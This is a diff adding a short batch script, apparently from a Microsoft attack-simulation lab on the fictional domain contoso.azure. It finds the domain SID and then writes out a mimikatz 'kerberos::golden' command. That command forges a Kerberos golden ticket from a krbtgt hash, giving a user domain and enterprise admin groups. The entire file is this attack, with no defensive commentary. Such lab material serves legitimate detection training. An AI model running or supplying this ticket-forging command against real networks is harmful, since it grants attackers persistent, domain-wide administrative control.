@@ -1,0 +1,9 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+:: find SID of domain (S-1-5-21-741769475-9874662-2937538298)
+whoami /user
+pause
+:: generate golden ticket 
+kerberos::golden /domain:contoso.azure /sid:S-1-5-21-741769475-9874662-2937538298 /krbtgt:dd6355495e6b67aa6d7d895b1ae7c9f4 /user:nuckc /id:500 /groups:500,501,512,513,520,518,519 /ticket:GTnuckc_20180708.kirbi
+pause
